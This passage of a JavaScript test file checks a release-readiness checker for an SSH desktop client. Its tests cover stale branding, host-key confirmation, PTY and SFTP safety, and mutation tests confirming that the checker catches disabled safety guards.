    /FAIL Repository release handoff playbook mentions 'healthy Git checkout'/,
  );
  assert.match(
    result.stdout,
    /FAIL Repository release handoff playbook mentions 'git fsck --strict'/,
  );
});

test("rejects stale changelog test-count and absolute coverage claims", (t) => {
  const result = runChecker(
    createFixture(t, {
      "CHANGELOG.md":
        "[0.1.0-beta.1]\n- Updated README with current test count (600).\n- Raised coverage thresholds to 100%.\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL CHANGELOG avoids stale fixed test-count or 100% coverage claims/,
  );
});

test("rejects stale public-facing branding and audit wording", (t) => {
  const result = runChecker(
    createFixture(t, {
      "README.md":
        "# JoeSSH\n[CI](https://github.com/atlasterm/atlasterm/actions/workflows/ci.yml)\nTeam/admin console skeleton\nSecurity audit: npm audit + audit-ci\n",
      ".env.example": "# AtlasTerm Environment Variables\n",
      LICENSE: "Copyright (c) 2026 AtlasTerm\n",
      "ARCHITECTURE.md": "Security gate: npm audit + audit-ci\n",
      "apps/desktop/public/llms.txt":
        "# AtlasTerm Workbench\n\nAtlasTerm is a local-first remote workbench.\n",
      "apps/desktop/public/humans.txt": "AtlasTerm Team\n",
      "apps/desktop/public/sw.js": 'const CACHE_NAME = "atlasterm-v1";\n',
      "apps/web/public/humans.txt": "AtlasTerm Team\n",
      "apps/web/public/sw.js": "const CACHE_NAME = 'atlasterm-admin-v1';\n",
      "services/sync/Cargo.toml":
        'version = "0.1.0-beta.1"\ndescription = "AtlasTerm sync service API"\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'github\.com\/atlasterm\/atlasterm'/,
  );
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'Team\/admin console skeleton'/,
  );
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'npm audit \+ audit-ci'/,
  );
  assert.match(
    result.stdout,
    /FAIL \.env example public release text avoids stale 'AtlasTerm Environment Variables'/,
  );
  assert.match(
    result.stdout,
    /FAIL License public release text avoids stale 'Copyright \(c\) 2026 AtlasTerm'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop llms\.txt public release text avoids stale 'AtlasTerm Workbench'/,
  );
  assert.match(
    result.stdout,
    /FAIL Web service worker public release text avoids stale 'atlasterm-admin-v1'/,
  );
  assert.match(
    result.stdout,
    /FAIL Architecture public release text avoids stale 'npm audit \+ audit-ci'/,
  );
});

test("rejects missing Desktop host-key confirmation trust surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/ConnectModal.tsx":
        "export function ConnectModal() { return null; }\n",
      "apps/desktop/src/panels.tsx":
        "export function SettingsPanel() { return null; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop connect modal host-key confirmation UX includes 'onHostKeyProbe'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop connect modal host-key confirmation UX includes 'desktop\.trustHostKeyAndConnect'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop settings known-host management UX includes 'knownHosts\.entries'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop settings known-host management UX includes 'desktop\.removeKnownHost'/,
  );
});

test("rejects missing Desktop PTY resize and reconnect runtime surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "crates/core/src/ssh.rs": "pub async fn probe_host_key() {}\n",
      "apps/desktop/src/XtermTerminal.tsx":
        "export function XtermTerminal() { return null; }\n",
      "apps/desktop/src/usePtySession.ts":
        "export function usePtySession() { return { status: 'open' }; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop SSH exec output resource limit includes 'SSH_EXEC_MAX_OUTPUT_BYTES'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop xterm PTY runtime UX includes 'ResizeObserver'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop PTY lifecycle hook includes 'exitCode'/,
  );
});

test("rejects a missing native PTY input module", (t) => {
  const root = createFixture(t);
  rmSync(join(root, "apps/desktop/src-tauri/src/pty_input.rs"));
  const result = runChecker(root);
  assert.equal(result.status, 1);
  assert.match(result.stdout, /FAIL Desktop native PTY input module exists/);
});

for (const mutation of [
  {
    name: "native write preflight bypass even when its call remains in a comment",
    path: "lib.rs",
    find: "ensure_safe_pty_write(&state, id, &data).await",
    replacement: "Ok(()) /* ensure_safe_pty_write(&state, id, &data).await */",
    failure: "Desktop native PTY serializes preflight before forwarding submitted bytes",
  },
  {
    name: "native input state delegation bypass",
    path: "lib.rs",
    find: "apply_pty_input_safety(input_state, data)",
    replacement: "Ok(()) /* apply_pty_input_safety(input_state, data) */",
    failure: "Desktop native PTY delegates each write to its persistent input state",
  },
  {
    name: "native destructive command detection removed from the input module",
    path: "pty_input.rs",
    find: "detect_dangerous_command(&command)",
    replacement: "None /* detect_dangerous_command(&command) */",
    failure: "Desktop native PTY module rejects explicitly destructive submitted text",
  },
  {
    name: "native input limit disabled while the constant and tests remain",
    path: "pty_input.rs",
    find: "input.command.len() == PTY_COMMAND_BUFFER_MAX_BYTES",
    replacement: "false /* input.command.len() == PTY_COMMAND_BUFFER_MAX_BYTES */",
    failure: "Desktop native PTY module bounds input state before inserting bytes",
  },
  {
    name: "native escape sequence limit disabled while the constant and tests remain",
    path: "pty_input.rs",
    find: "input.escape_sequence.len() >= ESCAPE_SEQUENCE_MAX_BYTES",
    replacement: "false /* input.escape_sequence.len() >= ESCAPE_SEQUENCE_MAX_BYTES */",
    failure: "Desktop native PTY module bounds partial escape sequences",
  },
  {
    name: "native PTY rejection changed to success",
    path: "pty_input.rs",
    find: 'return Err(format!("{PTY_COMMAND_BLOCKED}: {}", detected.pattern));',
    replacement: 'return Ok(()); /* return Err(format!("{PTY_COMMAND_BLOCKED}: {}", detected.pattern)); */',
    failure: "Desktop native PTY module rejects explicitly destructive submitted text",
  },
]) {
  test(`rejects ${mutation.name}`, (t) => {
    const root = createFixture(t);
    const path = join(root, "apps/desktop/src-tauri/src", mutation.path);
    const source = readFileSync(path, "utf8");
    assert.ok(source.includes(mutation.find), "mutation must change the runtime fixture");
    writeFileSync(path, source.replace(mutation.find, mutation.replacement));
    const result = runChecker(root);
    assert.equal(result.status, 1);
    assert.ok(result.stdout.includes(`FAIL ${mutation.failure}`), result.stdout);
  });
}

test("rejects missing Desktop SFTP overwrite and path safety surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/panels.tsx":
        "export function SftpPanel() { return null; }\n",
      "apps/desktop/src/sftpRemotePath.ts":
        "export function normalizeSftpRemotePath() { return '/'; }\n",
      "apps/desktop/src/useSftpTransfer.ts":
        "export function useSftpTransfer() { return {}; }\n",
      "apps/desktop/src-tauri/src/lib.rs": "fn sftp_read() {}\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP overwrite confirmation UX includes 'desktop\.sftpOverwriteTitle'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP remote path safety helpers includes 'joinSftpRemotePath'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP remote path safety helpers includes 'joinSftpRemoteEntryPath'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP transfer resource limit hook includes 'SFTP_TRANSFER_MAX_BYTES'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP transfer resource limit backend includes 'SFTP_MAX_TRANSFER_BYTES'/,
  );
});

test("rejects missing Desktop forwarding single-flight runtime surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/useForwardRules.ts":
        "export function useForwardRules() { return { runtime: {} }; }\n",
      "apps/desktop/src/panels.tsx":
        "export function ForwardingPanel() { return null; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop forwarding owns runtime and in-flight work per live session/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop forwarding pending action UX includes 'disabled=\{!forwards \|\| isPending\}'/,
  );
});

for (const mutation of [
  {
    name: "forwarding duplicate start guard removal",
    find: "if (!session || session.inFlight.has(id) || session.runtime[id]?.active) return;",
    replacement: "if (!session || session.runtime[id]?.active) return;",
    failure: "Desktop forwarding serializes start operations within their owning session",
  },
  {
    name: "forwarding duplicate stop guard removal",
    find: "if (!session || session.inFlight.has(id)) return;",
    replacement: "if (!session) return;",
    failure: "Desktop forwarding serializes stop operations within their owning session",
  },
  {
    name: "forwarding session identity comparison removal",
    find: "sessionsRef.current.get(sessionId) === session",
    replacement: "true",
    failure: "Desktop forwarding rejects state updates from expired session identities",
  },
  {
    name: "forwarding state update invalidation removal",
    find: "if (!isCurrent(session)) return;",
    replacement: "",
    failure: "Desktop forwarding rejects state updates from expired session identities",
  },
  {
    name: "forwarding late listener cleanup removal",
    find: "if (stop) await stop(forward_id).catch(() => undefined);",
    replacement: "",
    failure: "Desktop forwarding stops late listeners before publishing active state",
  },
  {
    name: "forwarding removed session cleanup removal",
    find: "disposeSession(session);",
    replacement: "",
    failure: "Desktop forwarding invalidates removed sessions and stops their listeners",
  },
  {
    name: "forwarding unmount identity disposal removal",
    find: "sessions.clear();",
    replacement: "",
    failure: "Desktop forwarding disposes all listeners and session identities on unmount",
  },
]) {
  test(`rejects ${mutation.name} even if retained in comments`, (t) => {
    const root = createFixture(t);
    const path = join(root, "apps/desktop/src/useForwardRules.ts");
    const source = readFileSync(path, "utf8");
    assert.ok(source.includes(mutation.find), "mutation must change the runtime fixture");
    writeFileSync(path, source.replace(mutation.find, `${mutation.replacement} /* ${mutation.find} */`));
    const result = runChecker(root);
    assert.equal(result.status, 1);
    assert.ok(result.stdout.includes(`FAIL ${mutation.failure}`), result.stdout);
  });
}
